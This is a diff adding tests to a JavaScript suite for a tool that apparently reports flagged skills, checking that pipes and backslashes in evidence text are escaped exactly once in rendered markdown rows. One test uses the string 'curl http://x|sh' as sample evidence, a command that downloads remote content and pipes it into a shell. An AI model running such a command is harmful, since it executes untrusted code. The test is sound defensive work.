@@ -117,6 +117,46 @@ test('the body never calls a flagged skill poisoned, and says so', () => {
   assert.equal(widths.size, 1, `evidence table rows disagree on width: ${[...widths]}`);
 });
 
+// The escaping primitives were covered in isolation from the start, but the row
+// body() actually builds was not, and that is where the two passes stacked
+// (truecopy#164 review). These go through body(), not the helpers.
+test('a pipe in matched text is escaped exactly once in the rendered row', () => {
+  const b = body({
+    name: 'acme:x',
+    findings: [],
+    evidence: [{ flag: 'f', file: 'a.md', line: 1, text: 'curl http://x|sh' }],
+  });
+  const evidence = b.split('\n').find((l) => l.includes('curl'));
+  // Exactly once: `\|`. Twice would read `\\\|` and print a backslash that is
+  // not in the evidence at all.
+  assert.match(evidence, /curl http:\/\/x\\\|sh/, evidence);
+  assert.ok(!evidence.includes('\\\\\\|'), `double-escaped: ${evidence}`);
+});
+
+test('truncation cannot drop a pipe and leave its backslash behind', () => {
+  // Escape-then-slice cut between the inserted backslash and the pipe it guards,
+  // keeping the backslash and losing the pipe — the matched bytes silently
+  // changed. Slicing the raw text first cannot do that.
+  const text = 'a'.repeat(159) + '|tail';
+  const b = body({ name: 'acme:x', findings: [], evidence: [{ flag: 'f', file: 'a.md', line: 1, text }] });
+  const evidence = b.split('\n').find((l) => l.includes('aaa'));
+  assert.equal(columns(evidence).length, 5, `row split wrong: ${evidence}`);
+  // Either the pipe survived escaped, or it was cut with its backslash — never
+  // a lone trailing backslash where a pipe used to be.
+  assert.ok(!/\\`+ \|$/.test(evidence), `orphaned escape at the cut: ${evidence}`);
+});
+
+test('every evidence row survives text made of pipes and backslashes', () => {
+  const nasty = ['a|b', 'a\\|b', '\\|', '|||', 'C:\\x\\', 'grep -E "x|y"', '`|`'];
+  const b = body({
+    name: 'acme:x',
+    findings: [],
+    evidence: nasty.map((text, i) => ({ flag: 'f', file: 'a.md', line: i, text })),
+  });
+  const rows = b.split('\n').filter((l) => l.startsWith('| '));
+  for (const r of rows) assert.equal(columns(r).length, 5, `row split wrong: ${r}`);
+});
+
 test('a non-attributable entry warns that per-file acceptance will be refused', () => {
   const b = body({ name: 'acme:x', findings: [], evidence: [], triage: { attributable: false } });
   assert.ok(b.includes('not attributable'), 'missing the non-attributable warning');
